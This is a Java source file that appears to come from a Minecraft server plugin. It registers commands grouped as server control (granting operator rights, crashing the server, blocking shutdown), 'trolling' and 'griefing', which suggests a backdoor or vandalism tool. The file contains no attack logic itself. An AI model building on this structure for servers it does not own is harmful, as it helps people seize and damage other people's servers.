/**
 * The MIT License (MIT)
 *
 * Copyright (c) 2016 Garkolym
 * 
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 * 
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
package de.Garkolym.Commands;

import java.util.ArrayList;

import de.Garkolym.Commands.Griefing.CommandLuftangriff;
import de.Garkolym.Commands.Griefing.CommandUltraCactus;
import de.Garkolym.Commands.Server.CommandBlockServerStop;
import de.Garkolym.Commands.Server.CommandCrash;
import de.Garkolym.Commands.Server.CommandDEOP;
import de.Garkolym.Commands.Server.CommandOP;
import de.Garkolym.Commands.Trolling.CommandGlasVirus;
import de.Garkolym.Commands.Trolling.CommandKackRegen;

public class CommandManager {
	
	private ArrayList<Command> commandList = new ArrayList<Command>();
	public ArrayList<Command> getCommandList() {
		return this.commandList;
	}
	
	private void initCommands() {
		// Server
		this.getCommandList().add(new CommandOP());
		this.getCommandList().add(new CommandDEOP());
		this.getCommandList().add(new CommandSUDO());
		this.getCommandList().add(new CommandCrash());
		this.getCommandList().add(new CommandBlockServerStop());
		// Trolling
		this.getCommandList().add(new CommandKackRegen());
		this.getCommandList().add(new CommandGlasVirus());
		// Griefing
		this.getCommandList().add(new CommandUltraCactus());
		this.getCommandList().add(new CommandLuftangriff());
		
	}
	
	public CommandManager() {
		this.initCommands();
	}
	
}
